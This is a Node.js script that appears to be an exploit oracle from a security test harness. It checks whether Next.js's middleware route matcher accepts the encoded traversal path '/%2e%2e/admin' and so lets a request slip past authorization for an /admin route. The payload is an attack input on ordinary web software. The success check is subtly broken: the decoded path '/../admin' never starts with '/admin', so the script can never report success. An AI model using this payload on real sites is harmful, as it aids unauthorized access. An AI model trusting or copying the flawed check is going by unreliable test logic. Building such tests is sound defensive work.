const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function emit(operation_completed, exploit_succeeded, evidence) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

(function main() {
  let operation_completed = false;
  try {
    const marker = path.join(os.tmpdir(), 'next-middleware-authz-oracle-' + process.pid + '-' + Date.now());
    fs.mkdirSync(marker, { recursive: true });

    const nextPkg = require('next/package.json');
    const version = nextPkg && nextPkg.version ? nextPkg.version : 'unknown';

    const matcherMod = require('next/dist/shared/lib/router/utils/middleware-route-matcher');
    if (!matcherMod || typeof matcherMod.getMiddlewareRouteMatcher !== 'function') {
      throw new Error('getMiddlewareRouteMatcher API not available');
    }

    const getMiddlewareRouteMatcher = matcherMod.getMiddlewareRouteMatcher;

    const matcher = getMiddlewareRouteMatcher([
      {
        regexp: '^/((?!api|_next/static|_next/image|favicon.ico).*)$',
        originalSource: '/((?!api|_next/static|_next/image|favicon.ico).*)'
      }
    ]);

    const benignPathname = '/dashboard';
    const benignReq = {
      nextUrl: { pathname: benignPathname },
      headers: {}
    };
    const benignResult = matcher(benignReq, {});
    if (benignResult !== true) {
      throw new Error('benign middleware match failed: expected true for ' + benignPathname + ', got ' + String(benignResult));
    }

    operation_completed = true;

    const protectedPrefix = '/admin';
    const maliciousPathname = '/%2e%2e/admin';
    const maliciousReq = {
      nextUrl: { pathname: maliciousPathname },
      headers: {}
    };

    const rawTargetsProtected = maliciousPathname.startsWith(protectedPrefix);
    let decodedOnce = '';
    try {
      decodedOnce = decodeURIComponent(maliciousPathname);
    } catch (_) {
      decodedOnce = '(decode failed)';
    }
    const decodedTargetsProtected = decodedOnce.startsWith(protectedPrefix);

    const maliciousResult = matcher(maliciousReq, {});

    const exploit_succeeded = maliciousResult === true && !rawTargetsProtected && decodedTargetsProtected;

    emit(operation_completed, exploit_succeeded,
      JSON.stringify({
        marker,
        version,
        benignPathname,
        benignResult,
        maliciousPathname,
        maliciousResult,
        rawTargetsProtected,
        decodedOnce,
        decodedTargetsProtected,
        rationale: 'Exploit is considered successful when middleware matcher accepts an encoded traversal-style path that decodes into a protected /admin path.'
      })
    );
  } catch (e) {
    emit(false, false, e && e.stack ? e.stack : String(e));
  }
})();